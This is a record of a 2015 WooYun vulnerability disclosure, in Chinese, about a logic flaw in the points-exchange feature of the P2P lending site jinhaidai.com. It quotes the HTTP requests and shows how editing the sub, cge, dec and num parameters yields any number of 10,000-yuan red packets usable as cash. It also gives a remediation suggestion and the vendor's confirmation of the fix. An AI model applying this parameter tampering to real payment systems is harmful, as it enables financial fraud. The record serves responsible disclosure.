{"id": 21600, "wybug_id": "wooyun-2015-0115025", "wybug_title": "p2p金融安全之金海贷又一严重逻辑漏洞", "wybug_corp": "jinhaidai.com", "wybug_author": "her0ma", "wybug_date": "2015-05-19 22:56", "wybug_open_date": "2015-07-04 10:34", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-04：\t细节向公众公开  简要描述： 5.20放假的节操公司，我喜欢！ 详细说明：  积分兑换功能存在逻辑漏洞，攻击者可以利用该逻辑漏洞兑换任意金额和数量的红包，投资的时候红包可以当RMB使用的，功能URL如下：https://www.jinhaidai.com/integral/conversion点立即兑换，抓包请求如下：POST /integral/onceconver?sub=10000&cge=0&dec=0 HTTP/1.1Host: www.jinhaidai.comJHD_CSRF_TOKEN=84a085480134a3949edcf917c744e0151c72e753将sub的值修改为10000，红包的金额就相当于1W元，然后将cge、dec的值都修改为0，继续点立即兑换，抓包如下：POST /integral/buyitem HTTP/1.1Host: www.jinhaidai.comJHD_CSRF_TOKEN=84a085480134a3949edcf917c744e0151c72e753&type=10000&num=13&cge=0&nendinvest=0将num修改为任意数字，13代表13张，然后点击提交该请求，会发现成功兑换了13张金额10000的红包。业务设计实际上没有10000元的红包，并且红包都需要积分的。利用该漏洞就绕过了业务的限制，如图：\n\n   漏洞证明：  \n\n   修复方案：  同样的支付类逻辑漏洞，如果一定需要用URL传递相关参数，建议进行后端的签名验证。PS：请多给RANK，进入蓝V行列还是一条漫长的路.....   版权声明：转载请注明来源 her0ma@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-05-20 10:33 厂商回复： 非常感谢\"her0ma\"提供的漏洞信息，漏洞现已修复 ！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-06 12:12 |    \t\tAnders \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 测试工程师)\t\t \n  进入蓝V行列还是一条漫长的路，加油！！！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}